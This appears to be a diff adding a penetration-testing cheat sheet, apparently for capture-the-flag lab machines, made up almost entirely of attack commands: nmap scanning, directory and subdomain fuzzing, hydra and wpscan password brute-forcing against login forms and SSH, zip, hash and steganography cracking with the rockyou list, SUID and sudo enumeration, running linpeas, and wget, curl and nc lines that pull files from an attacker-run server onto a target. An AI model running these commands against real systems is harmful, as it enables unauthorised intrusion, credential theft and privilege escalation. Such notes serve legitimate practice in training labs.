@@ -1,0 +1,40 @@
+nmap -vv -sC -sV -oN nmap.log 10.10.10.10
+nmap -vv -A -p- -oN nmap-complete.log 10.10.10.10
+
+gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.log -t 200 -u $URL
+wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/FUZZ
+wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/?parameter=FUZZ
+wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 200 --hc 404 -R $DEPTH http://www.host.name/FUZZ
+
+hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "<Login Page>:<Request Body>:<Error Message>"
+hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "<Login Page>:<Request Body>:<Error Message>"
+
+wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames usernames.txt
+
+wfuzz -c -f wfuzz-sub.log -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u $URL -H "Host: FUZZ.host.name" -t 32 --hc 200 --hw 356
+gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL -t 32
+
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
+hashcat -m $MODE hashes /usr/share/wordlists/rockyou.txt
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -t 4 ssh
+
+pip3 install stegcracker
+python3 -m stegcracker tocrack.jpg
+
+Privescs Discovery:
+find / -perm -u=s -type f 2>/dev/null
+sudo -l
+
+chmod +x linpeas.sh
+./linpeas.sh
+
+Transferring Files:
+python3 -m http.server -b 10.10.10.10 1234
+php -S 10.10.10.10:1234
+wget http://10.10.10.10:1234file
+curl http://10.10.10.10:1234/file -o target_file
+nc 10.10.10.10 1234 > target_file
+
+# Server : nc -lp 1234 < file
+
+# Client : nc 10.10.10.10 1234 > file
